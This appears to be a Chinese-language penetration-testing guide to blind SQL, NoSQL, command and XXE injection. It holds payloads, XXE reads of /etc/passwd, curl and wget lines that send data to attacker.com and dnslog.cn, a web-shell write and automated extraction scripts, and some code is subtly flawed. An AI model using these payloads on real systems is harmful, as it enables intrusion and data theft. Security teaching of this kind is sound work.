# 盲注技术指南方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供盲注（Blind Injection）技术的系统化方法，帮助在无直接回显的环境中成功检测和利用注入漏洞。

## 1.2 适用范围
适用于 SQL 盲注、NoSQL 盲注、命令注入盲注、XXE 盲注等无直接回显的场景。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：盲注技术

### 2.1 技术介绍

盲注是指攻击者无法直接从响应中看到注入结果，需要通过间接方式（布尔响应差异、时间延迟、带外请求）来判断注入是否成功以及提取数据的攻击技术。

**盲注类型：**
| 类型 | 判断依据 | 适用场景 |
|-----|---------|---------|
| **布尔盲注** | 页面内容差异 | 响应内容随条件变化 |
| **时间盲注** | 响应时间差异 | 可执行时间延迟函数 |
| **带外盲注** | DNS/HTTP 请求 | 服务器可访问外网 |

### 2.2 布尔盲注

#### 2.2.1 原理

通过构造真假两个条件，观察响应内容的差异来判断注入是否成功。

#### 2.2.2 SQL 布尔盲注

**测试 Payload：**
```sql
# 真条件
id=1 AND 1=1
id=1' AND '1'='1
id=1 AND LENGTH((SELECT version()))>0

# 假条件
id=1 AND 1=2
id=1' AND '1'='2
id=1 AND LENGTH((SELECT version()))<0
```

**响应分析：**
```
# 观察指标
- 页面内容长度变化
- HTTP 状态码变化
- 页面元素差异
- 错误信息有无
```

**数据提取：**
```sql
# 判断数据库名长度
AND LENGTH(database()) > 5  # 真
AND LENGTH(database()) > 10 # 假
# 推断长度为 5-10

# 逐字符提取数据库名
AND SUBSTRING(database(),1,1) = 't'  # 假
AND SUBSTRING(database(),1,1) = 'u'  # 真
# 第一个字符是 u

AND SUBSTRING(database(),2,1) = 's'  # 真
# 第二个字符是 s

# 继续提取直到完整
```

**二分法优化：**
```sql
# 使用 ASCII 值二分
AND ASCII(SUBSTRING(database(),1,1)) > 100  # 真
AND ASCII(SUBSTRING(database(),1,1)) > 115  # 假
# 字符 ASCII 在 100-115 之间

AND ASCII(SUBSTRING(database(),1,1)) > 107  # 真
# 缩小范围到 107-115
```

#### 2.2.3 NoSQL 布尔盲注

**MongoDB 测试 Payload：**
```javascript
// 真条件
{"$where": "this.username.length > 0"}
{"$where": "this.password[0] === 'a'"}

// 假条件
{"$where": "this.username.length < 0"}
{"$where": "this.password[0] === 'z'"}
```

#### 2.2.4 命令注入布尔盲注

**测试 Payload：**
```bash
# 真条件
; if [ $(whoami | cut -c1) = 'r' ]; then ping -c 5 127.0.0.1; fi

# 假条件
; if [ $(whoami | cut -c1) = 'x' ]; then ping -c 5 127.0.0.1; fi
```

### 2.3 时间盲注

#### 2.3.1 原理

通过构造时间延迟 Payload，观察响应时间的差异来判断注入是否成功。

#### 2.3.2 SQL 时间盲注

**各数据库 Payload：**

```sql
# MySQL
AND SLEEP(5)
AND BENCHMARK(10000000, SHA1('test'))

# PostgreSQL
; SELECT pg_sleep(5)

# SQL Server
; WAITFOR DELAY '0:0:5'

# Oracle
; BEGIN DBMS_LOCK.SLEEP(5); END;

# SQLite
; SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END;
```

**数据提取：**
```sql
# 条件时间延迟
AND IF(1=1, SLEEP(5), 0)
AND IF(SUBSTRING(database(),1,1)='u', SLEEP(5), 0)

# 响应时间分析
正常响应：0.5 秒
延迟响应：5.5 秒
# 说明条件为真
```

#### 2.3.3 命令注入时间盲注

**测试 Payload：**
```bash
# 基础延迟
; sleep 5
; ping -c 5 127.0.0.1

# 条件延迟
; if [ $(whoami | cut -c1) = 'r' ]; then sleep 5; fi
; [ $(whoami | cut -c1) = 'r' ] && sleep 5
```

#### 2.3.4 NoSQL 时间盲注

**MongoDB Payload：**
```javascript
// 时间延迟
{"$where": "function(){ sleep(5000); return true; }"}

// 条件延迟
{"$where": "if(this.password[0]=='a'){ sleep(5000); }"}
```

### 2.4 带外（OOB）盲注

#### 2.4.1 原理

通过让目标服务器发起 DNS 或 HTTP 请求到攻击者控制的服务器，从而获取数据或确认漏洞。

#### 2.4.2 DNSLog 技术

**服务推荐：**
- dnslog.cn
- ceye.io
- interact.sh
- Burp Collaborator

**SQL 注入 DNSLog：**
```sql
# MySQL (需要文件权限)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\a'))

# SQL Server
; EXEC xp_dirtree '\\dnslog.cn\test'

# PostgreSQL (需要 COPY 权限)
; COPY (SELECT version()) TO '\\dnslog.cn\test';
```

**命令注入 DNSLog：**
```bash
# Linux
; ping $(whoami).dnslog.cn
; curl http://dnslog.cn/$(whoami)
; wget http://dnslog.cn/$(whoami)

# Windows
& ping $(whoami).dnslog.cn
& nslookup dnslog.cn
```

**XXE DNSLog：**
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://dnslog.cn/%file;">
  %remote;
]>
```

#### 2.4.3 HTTPLog 技术

**命令注入 HTTPLog：**
```bash
# 数据外带
; curl http://attacker.com/$(whoami | base64)
; wget http://attacker.com/$(cat /etc/passwd | base64)

# PowerShell
; powershell -c "Invoke-WebRequest http://attacker.com/$(whoami)"
```

**SQL 注入 HTTPLog：**
```sql
# MySQL (需要 OUTFILE 权限)
SELECT ... INTO OUTFILE '/var/www/shell.php'

# SQL Server
; EXEC xp_cmdshell 'curl http://attacker.com/data'
```

### 2.5 自动化提取脚本

#### 2.5.1 Python 布尔盲注脚本

```python
import requests
import string

def blind_injection(url, param, query):
    """布尔盲注数据提取"""
    result = ""
    chars = string.ascii_lowercase + string.digits + "_@"
    
    for i in range(1, 50):  # 最多 50 个字符
        for char in chars:
            payload = f"{param}={query} AND SUBSTRING((SELECT version()),{i},1)='{char}'"
            response = requests.get(url + "?" + payload)
            
            if len(response.text) > 1000:  # 根据实际调整
                result += char
                print(f"Position {i}: {char}")
                break
        else:
            break  # 没有找到字符，结束
    
    return result
```

#### 2.5.2 Python 时间盲注脚本

```python
import requests
import time

def time_based_injection(url, param, query):
    """时间盲注数据提取"""
    result = ""
    chars = string.ascii_lowercase + string.digits + "_@"
    
    for i in range(1, 50):
        for char in chars:
            payload = f"{param}={query} AND IF(SUBSTRING((SELECT version()),{i},1)='{char}',SLEEP(2),0)"
            
            start = time.time()
            response = requests.get(url + "?" + payload)
            elapsed = time.time() - start
            
            if elapsed > 2:
                result += char
                print(f"Position {i}: {char}")
                break
    
    return result
```

### 2.6 盲注测试流程

```
1. 漏洞类型判断
   ├── 布尔盲注测试
   ├── 时间盲注测试
   └── 带外盲注测试

2. 选择合适方法
   ├── 有内容差异 -> 布尔盲注
   ├── 可时间延迟 -> 时间盲注
   └── 可外网访问 -> 带外盲注

3. 数据提取
   ├── 确定提取策略
   ├── 编写自动化脚本
   └── 执行数据提取

4. 结果验证
   └── 验证提取数据准确性
```

---

# 第三部分：附录

## 3.1 盲注 Payload 速查表

| 类型 | 数据库 | Payload |
|-----|--------|---------|
| **布尔盲注** | MySQL | `AND 1=1` / `AND 1=2` |
| **布尔盲注** | PostgreSQL | `AND 1=1` / `AND 1=2` |
| **布尔盲注** | SQL Server | `AND 1=1` / `AND 1=2` |
| **时间盲注** | MySQL | `AND SLEEP(5)` |
| **时间盲注** | PostgreSQL | `; SELECT pg_sleep(5)` |
| **时间盲注** | SQL Server | `; WAITFOR DELAY '0:0:5'` |
| **时间盲注** | Oracle | `; BEGIN DBMS_LOCK.SLEEP(5); END;` |
| **带外** | MySQL | `SELECT LOAD_FILE('\\\\host\\a')` |
| **带外** | SQL Server | `; EXEC xp_dirtree '\\host\test'` |
| **带外** | 命令 | `; ping $(whoami).dnslog.cn` |

## 3.2 参考资源

- [OWASP Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger - Blind SQLi](https://portswigger.net/web-security/sql-injection/blind)
- [SQLMap Blind Injection](https://sqlmap.org/)
